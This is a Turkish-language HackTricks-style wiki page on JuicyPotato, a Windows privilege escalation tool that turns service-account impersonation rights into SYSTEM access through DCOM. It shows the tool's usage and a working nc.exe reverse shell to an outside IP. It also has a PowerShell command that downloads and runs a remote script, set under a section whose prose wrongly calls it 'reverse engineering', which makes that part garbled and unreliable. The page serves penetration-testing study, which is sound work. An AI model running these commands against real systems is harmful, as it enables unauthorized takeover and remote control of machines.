# JuicyPotato

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile göndererek paylaşın**.

</details>

{% hint style="warning" %}
**JuicyPotato**, Windows Server 2019 ve Windows 10 sürüm 1809'dan itibaren çalışmamaktadır. Bununla birlikte, **PrintSpoofer**, **RoguePotato**, **SharpEfsPotato** aynı yetkileri kullanarak ve `NT AUTHORITY\SYSTEM` düzeyinde erişim sağlamak için kullanılabilir. _**Kontrol edin:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (altın yetkileri kötüye kullanma) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Biraz meyve suyu eklenmiş_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_'nun tatlandırılmış bir versiyonu, yani **Windows Hizmet Hesaplarından NT AUTHORITY\SYSTEM'e yerel ayrıcalık yükseltme aracı**_

#### Juicypotato'yı [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) adresinden indirebilirsiniz.

### Özet <a href="#summary" id="summary"></a>

**[Juicy-potato Readme'den](https://github.com/ohpe/juicy-potato/blob/master/README.md):**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) ve [varyantları](https://github.com/decoder-it/lonelypotato), [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [hizmeti](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) temelindeki ayrıcalık yükseltme zincirini kullanır ve `SeImpersonate` veya `SeAssignPrimaryToken` ayrıcalıklarına sahip olduğunuzda `127.0.0.1:6666` üzerinde MiTM dinleyiciye sahiptir. Bir Windows derleme incelemesi sırasında, `BITS`'in kasıtlı olarak devre dışı bırakıldığı ve `6666` numaralı bağlantı noktasının alındığı bir yapı bulduk.

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)'yi silahlandırmaya karar verdik: **Juicy Potato'ya merhaba deyin**.

> Teori için [Rotten Potato - Hizmet Hesaplarından SYSTEM'e Ayrıcalık Yükseltme](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) makalesine bakın ve bağlantılar ve referanslar zincirini takip edin.

`BITS` dışında, kullanabileceğimiz birkaç COM sunucusu olduğunu keşfettik. Bunlar sadece:

1. mevcut kullanıcı tarafından anında oluşturulabilir, genellikle bir "hizmet kullanıcısı" olan ve taklit yetkilerine sahip olan
2. `IMarshal` arabirimini uygulayabilir
3. yükseltilmiş bir kullanıcı olarak çalışabilir (SYSTEM, Yönetici, ...)

Bazı testlerden sonra, çeşitli Windows sürümlerindeki [ilginç CLSID'lerin](http://ohpe.it/juicy-potato/CLSID/) kapsamlı bir listesini elde ettik ve test ettik.

### Detaylar <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato ile şunları yapabilirsiniz:

* **Hedef CLSID** _istediğiniz herhangi bir CLSID'yi seçin._ [_Burada_](http://ohpe.it/juicy-potato/CLSID/) _OS'ye göre düzenlenmiş listeyi bulabilirsiniz._
* **COM Dinleme bağlantı noktası** _sabitlenmiş 6666 yerine tercih ettiğiniz COM dinleme bağlantı noktasını tanımlayın_
* **COM Dinleme IP adresi** _sunucuyu herhangi bir IP'ye bağlayın_
* **Proses oluşturma modu** _taklit edilen kullanıcının ayrıcalıklarına bağlı olarak aşağıdakilerden seçim yapabilirsiniz:_
* `CreateProcessWithToken` (`SeImpersonate` gerektirir)
* `CreateProcessAsUser` (`SeAssignPrimaryToken` gerektirir)
* `her ikisi`
* **Başlatılacak Proses** _saldırı başarılı olduğunda bir yürütülebilir veya komut dosyası başlatın_
* **Proses Argümanı** _başlatılan işlem argümanlarını özelleştirin_
* **RPC Sunucusu adresi** _gizli bir yaklaşım için harici bir RPC sunucusuna kimlik doğrulayabilirsiniz_
* **RPC Sunucusu bağlantı noktası** _eğer harici bir sunucuya kimlik doğrulamak istiyorsanız ve güvenlik duvarı port `135`'i engelliyorsa işe yarar..._
* **TEST modu** _çoğunlukla test amaçlıdır, yani CLSID'leri test etmek için. DCOM'u oluşturur ve token'ın kullanıcısını yazdırır. Test için_ [_buraya bakın_](http://ohpe.it/juicy-potato/Test/)

### Kullanım <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Son düşünceler <a href="#final-thoughts" id="final-thoughts"></a>

**[Juicy-potato Readme'den](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts):**

Eğer kullanıcının `SeImpersonate` veya `SeAssignPrimaryToken` yetkileri varsa, o zaman **SYSTEM** olursunuz.

Tüm bu COM Sunucularının kötüye kullanılmasını engellemek neredeyse imkansızdır. Bu nesnelerin izinlerini `DCOMCNFG` aracılığıyla değiştirmeyi düşünebilirsiniz, ama iyi şanslar, bu zor olacak.

Gerçek çözüm, `* SERVICE` hesapları altında çalışan hassas hesapları ve uygulamaları korumaktır. `DCOM`'u durdurmak bu saldırıyı kesinlikle engeller, ancak altta yatan işletim sistemi üzerinde ciddi bir etkisi olabilir.

Kaynak: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Örnekler

Not: Denemek için CLSID'lerin bir listesi için [bu sayfayı](https://ohpe.it/juicy-potato/CLSID/) ziyaret edin.

### Bir nc.exe ters kabuk alın
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell tersine mühendislik

Bu bölümde, Powershell tersine mühendislik tekniklerini ele alacağız. Powershell, Windows işletim sistemlerinde kullanılan bir betikleme dilidir ve sıklıkla siber saldırganlar tarafından hedef sistemlere erişim sağlamak için kullanılır.

Powershell tersine mühendislik, bir Powershell betiğini analiz etmek ve içindeki işlevleri, değişkenleri ve komutları anlamak için kullanılan bir yöntemdir. Bu, saldırganların hedef sisteme zararlı kod enjekte etmek veya hassas bilgilere erişmek için kullanabileceği bir yetenektir.

Powershell tersine mühendislik teknikleri, Powershell betiğinin çalışma mantığını anlamak, kodu analiz etmek ve potansiyel güvenlik açıklarını tespit etmek için kullanılır. Bu teknikler, saldırganların hedef sistemdeki zayıf noktaları tespit etmelerine ve daha sonra bu zayıf noktaları kullanarak hedef sistemdeki ayrıcalıkları yükseltmelerine olanak tanır.

Powershell tersine mühendislik, siber güvenlik uzmanları ve pentester'lar tarafından kullanılan bir beceridir. Bu teknikleri kullanarak, saldırganlar hedef sistemdeki güvenlik açıklarını tespit edebilir ve bu açıkları kullanarak hedef sistemdeki ayrıcalıkları yükseltebilir. Bu nedenle, siber güvenlik uzmanlarının ve sistem yöneticilerinin Powershell tersine mühendislik tekniklerine karşı savunma mekanizmaları geliştirmeleri önemlidir.
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Yeni bir CMD başlatın (RDP erişiminiz varsa)

![](<../../.gitbook/assets/image (37).png>)

## CLSID Sorunları

Genellikle, JuicyPotato'nun kullandığı varsayılan CLSID **çalışmaz** ve saldırı başarısız olur. Genellikle, **çalışan bir CLSID** bulmak için birden fazla deneme yapmak gerekmektedir. Belirli bir işletim sistemi için denemek için CLSID listesine ihtiyacınız varsa, bu sayfayı ziyaret etmelisiniz:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSIDs'i Kontrol Etme**

İlk olarak, juicypotato.exe dışında bazı yürütülebilir dosyalara ihtiyacınız olacak.

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)'i indirin ve PS oturumunuza yükleyin, [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)'i indirin ve çalıştırın. Bu komut dosyası, test etmek için olası CLSID'lerin bir listesini oluşturacaktır.

Ardından [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)'ı indirin (CLSİD listesinin yolunu ve juicypotato yürütülebilir dosyasının yolunu değiştirin) ve çalıştırın. Her CLSID'yi denemeye başlayacak ve **port numarası değiştiğinde, CLSID'nin çalıştığı anlamına gelecektir**.

**Çalışan CLSİD'leri** -c parametresini kullanarak **kontrol edin**

## Referanslar
* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>AWS hackleme hakkında sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne erişim sağlamak veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **göndererek paylaşın**.

</details>
